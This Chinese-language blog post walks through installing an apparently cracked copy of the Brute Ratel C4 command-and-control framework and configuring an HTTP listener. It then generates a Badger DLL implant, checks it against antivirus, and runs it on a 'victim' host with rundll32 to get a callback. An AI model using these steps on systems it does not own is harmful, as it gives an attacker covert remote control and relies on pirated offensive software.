---
date: 2024-08-17 12:00:00
---

# 远控BRC4安装与简单上线


Brute Ratel C4是一款类似于Cobalt Strike的商业红队武器框架，每年License收费为3000美元，客户需要提供企业电子邮件地址并在颁发许可证之前进行验证，首个版本Brute Ratel C4 v0.2于2021年2月9日发布，它是由Mandiant和CrowdStrike的前红队队员Chetan Nayak创建的，该工具独特之处在于它专门设计防止端点检测和响应(EDR)和防病毒(AV)软件的检测，是一款新型的红队商业对抗性攻击模拟武器。

与Cobalt Strike的Beacon后门类似，Brute Ratel C4允许红队在远程终端主机上部署Badger后门程序，Badger连接回攻击者的命令和控制服务器，接收服务器端的命令执行相关的恶意行为。

[BRC4官网](https://bruteratel.com/)

![CleanShot 2024-08-17 at 00.22.18@2x.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/picCleanShot%202024-08-17%20at%2000.22.18@2x.png)


在kali中进行安装。首先对压缩包进行解压。

::: code-group
```bash [bash]
kali :: ~/Desktop/BRC4 » unzip BRC4.zip
```
:::

得到如下文件：

![CleanShot 2024-08-17 at 00.29.54@2x.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/picCleanShot%202024-08-17%20at%2000.29.54@2x.png)

给予`brute-ratel-linx64_crack` 和 `lib64/commander` 执行权限


::: code-group
```bash [bash]
kali :: ~/Desktop/BRC4 » chmod +x x brute-ratel-linx64_crack                                   1 ↵
kali :: ~/Desktop/BRC4 » chmod +x lib64/commander                                            130 ↵
```
:::

启动服务端，其中用户名为`hack`，密码为`p@ssw0d`，端口为`7788`，可以自行调整。
:::code-group
```bash [bash]
kali :: ~/Desktop/BRC4 » ../brute-ratel-linx64_crack -ratel -a hack -p p@ssw0d -h 127.0.0.1:7788 -sc
 cert.pem -sk key.pem
```
:::

![CleanShot 2024-08-17 at 00.32.05@2x.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/picCleanShot%202024-08-17%20at%2000.32.05@2x.png)

接下来打开图形界面，首先赋予执行权限
:::code-group
```bash [bash]
kali :: ~/Desktop/BRC4 » chmod +x Rungui.sh
```
:::

启动图形界面
:::code-group
```bash [bash]
kali :: ~/Desktop/BRC4 » ./Rungui.sh                                                    130 ↵
```
:::

启动了图形界面后，接下来输入前面设定好的用户名和密码，点击猴子就可以成功登录。

![image-20240817003911885](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/image-20240817003911885.png)

![image-20240817004013352](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/image-20240817004013352.png)

进入客户端之后，点击`C4 Profiler`，然后点击`Add Http Listener`，这里和CS的步骤一样，需要先创建并配置一个监听器。

![image-20240817004225691](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/image-20240817004225691.png)

接下来配置监听器，配置的内容为：
1. `Listener name`：监听器的名称，自定义。
2. `Listener bind host`：设置监听地址，当前选择主机的 IP即可。
3. `Rotational hosts`：重定向地址，当前点击右侧same按钮选择和监听器一样的地址。
4. `Port`：端口自定义
5. `Useragent`：默认即可。UA头
6. `URI(S)`：瞎写就可以，随便。
7. `OS`：默认
8. `SSL`：选择`No`，如果选择`Yes`，可能会导致无法上线。
9. `Sleep mask`：默认
10. `Sleep`,`Jitter`：类似CS的延时时间，建议调低。
11. `Create random set of authentication keys`,`Die if C2 is inaccessible?(Initialization only)`：勾选，马子如果不上线，不会一直请求。

![image-20240817004958076](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/image-20240817004958076.png)

![image-20240817005241617](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/image-20240817005241617.png)

配置完成后，点击`Save`保存，即可创建一个监听器。

右键点击该监听器，选择`Stageless`，选择`x64 Arch (Default)`，选择`dll`，这里是根据前面创建监听器时设置的架构来选择的。即可生成对应架构的马。

![image-20240817005459015](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/image-20240817005459015.png)

![image-20240817005623775](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/image-20240817005623775.png)

对生成的DLL随手查杀一下

![image.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240817010536.png)

将这个DLL放到受害者的主机上，为了方便测试，直接在cmd终端执行命令：
:::code-group
```powershell [powershell]
rundll32 badger_x64.dll,main
```
:::

可以看到，成功上线了。

![image.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240817011006.png)

更多后续使用方法再玩玩后分享。

